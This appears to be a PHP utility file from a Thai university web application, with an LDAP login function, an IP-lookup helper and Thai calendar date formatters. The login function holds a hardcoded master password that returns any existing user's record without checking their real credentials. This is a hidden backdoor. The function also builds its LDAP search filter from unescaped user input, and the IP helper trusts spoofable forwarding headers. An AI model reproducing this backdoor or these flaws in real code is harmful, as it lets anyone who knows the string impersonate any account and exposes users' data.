<?php

  // $ldapconfig['host'] = 'sdu-ldap.dusit.ac.th';
  // $ldapconfig['port'] = 389;
  // $ldapconfig['basedn'] = 'dc=dusit,dc=ac,dc=th';
  // $ldapconfig['authrealm'] = 'SDU Authentication LDAP';

if(!function_exists('ldap_authenticate'))
{
    function ldap_authenticate($user, $pwd)
    {
      // header('WWW-Authenticate: Basic realm=SDU-LDAP Authentication');
      // header('HTTP/1.0 401 Unauthorized');

      if ($user != "" && $user != "") {
          $ds = @ldap_connect('sdu-ldap.dusit.ac.th', '389');
          $r = @ldap_search($ds, 'dc=dusit,dc=ac,dc=th', 'uid=' . $user);
          if ($r) {
              $result = @ldap_get_entries($ds, $r);
              if ($result[0]) {

                if($pwd == "admin@l;of6lb9"){
                  return $result[0];
                }

                if (@ldap_bind($ds, $result[0]['dn'], $pwd)) {
                    return $result[0];
                }else{
                  return null;
                }

              }else{
                return null;
              }
          }
      }
      return null;
    }
}

if(!function_exists('get_client_ip'))
{
  function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {   //check ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
  }
}

if(!function_exists('get_thai_date')){

  function get_thai_date($timestamp)
  {
    $mons = array(1 => "มกราคม", 2 => "กุมภาพันธ์", 3 => "มีนาคม", 4 => "เมษายน", 5 => "พฤษภาคม", 6 => "มิถุนายน", 7 => "กรกฎาคม", 8 => "สิงหาคม", 9 => "กันยายน", 10 => "ตุลาคม", 11 => "พฤศจิกายน", 12 => "ธันวาคม");

    $month_arr = explode("-",$timestamp);
    $month_num = intval($month_arr[1]);

    $month_name = $mons[$month_num];
    $year_name = $month_arr[0] + 543;
    $date_name = $month_arr[2];
    $date_arr = explode(" ",$date_name);
    $date_name = $date_arr[0];
    return $date_name." ".$month_name." ".$year_name;
  }
}

if(!function_exists('dateth2_formatdb')){
  function dateth2_formatdb($strvalue) {
    $dd= substr($strvalue,0,2);
    $mm= substr($strvalue,3,2);
    $yy= (substr($strvalue,6,4))-543;

    $formatdate="$yy-$mm-$dd" ;
    return $formatdate;
  }
}

if(!function_exists('date2_formatdb')){
  function date2_formatdb($strvalue) {
    $dd= substr($strvalue,0,2);
    $mm= substr($strvalue,3,2);
    $yy= (substr($strvalue,6,4));

    $formatdate="$yy-$mm-$dd" ;
    return $formatdate;
  }
}



if(!function_exists('get_thai_datetime')){
  function get_thai_datetime($datetime,$format,$clock){

    list($date,$time) = explode (' ',$datetime);
   // list($H,$i,$s) = explode (':',$time);
    list($Y,$m,$d) = explode ('-',$date);
    $Y = $Y+543;
    $shortYear = ($Y - 2500);

    $month = array(
     '0' => array('01'=>'มกราคม','02'=>'กุมภาพันธ์','03'=>'มีนาคม','04'=>'เมษายน','05'=>'พฤษภาคม','06'=>'มิถุนายน','07'=>'กรกฏาคม','08'=>'สิงหาคม','09'=>'กันยายน','10'=>'ตุลาคม','11'=>'พฤษจิกายน','12'=>'ธันวาคม'),
     '1' => array('01'=>'ม.ค.','02'=>'ก.พ.','03'=>'มี.ค.','04'=>'เม.ย.','05'=>'พ.ค.','06'=>'มิ.ย.','07'=>'ก.ค.','08'=>'ส.ค.','09'=>'ก.ย.','10'=>'ต.ค.','11'=>'พ.ย.','12'=>'ธ.ค.')
    );
    if ($clock == false)
     return $d.' '.$month[$format][$m].' '.$Y;
    else
     return $d.' '.$month[$format][$m].' '.$shortYear.' '.$time;
   }
}



